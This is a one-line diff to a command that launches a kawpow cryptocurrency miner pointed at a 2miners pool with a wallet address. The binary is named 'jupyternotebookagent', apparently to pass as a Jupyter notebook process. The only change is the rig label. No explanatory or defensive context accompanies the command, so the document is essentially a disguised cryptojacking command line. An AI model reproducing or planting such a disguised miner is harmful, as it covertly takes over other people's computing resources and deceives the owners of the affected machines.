@@ -1,1 +1,1 @@
-/usr/local/bin/jupyternotebookagent -a kawpow -o stratum+tcp://xna.2miners.com:6060 --user NibTPifN31vLNqZK1zUTX7LpeM2zAxw6Ek.RIG_6 -p x
+/usr/local/bin/jupyternotebookagent -a kawpow -o stratum+tcp://xna.2miners.com:6060 --user NibTPifN31vLNqZK1zUTX7LpeM2zAxw6Ek.RIG_5 -p x
